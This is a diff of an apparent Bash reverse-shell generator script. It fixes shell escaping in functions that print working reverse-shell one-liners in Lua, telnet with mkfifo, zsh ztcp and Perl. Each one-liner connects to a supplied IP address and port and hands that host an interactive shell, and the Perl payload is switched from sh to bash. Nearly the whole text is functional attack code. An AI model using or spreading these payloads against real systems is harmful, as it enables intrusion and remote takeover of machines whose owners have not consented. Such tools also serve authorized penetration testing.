@@ -92,7 +92,7 @@ function RevMkfifo(){
 }
 
 function RevLua(){
-  shell="lua5.1 -e 'local host, port = "$ipAddress", $puerto local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'"
+  shell="lua5.1 -e 'local host, port = "$ipAddress", $puerto local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
   echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
 }
 
@@ -108,12 +108,12 @@ function RevSocat(){
 }
 
 function RevTelnet(){
-  shell="TF=$(mktemp -u);mkfifo $TF && telnet $ipAddress $puerto 0<$TF | sh 1>$TF"
+  shell="TF=\$(mktemp -u);mkfifo \$TF && telnet $ipAddress $puerto 0<\$TF | sh 1>\$TF"
   echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
 }
 
 function RevZsh(){
-  shell="zsh -c 'zmodload zsh/net/tcp && ztcp $ipAddress $puerto && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+  shell="zsh -c 'zmodload zsh/net/tcp && ztcp $ipAddress $puerto && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'"
   echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
 }
 
@@ -128,7 +128,7 @@ function RevPython(){
 }
 
 function RevPerl(){
-  shell="perl -e 'use Socket;$i="$ipAddress";$p=$puerto;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
+  shell="perl -e 'use Socket;\$i=\"$ipAddress\";\$p=$puerto;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -i\");};'"
   echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
 }
 
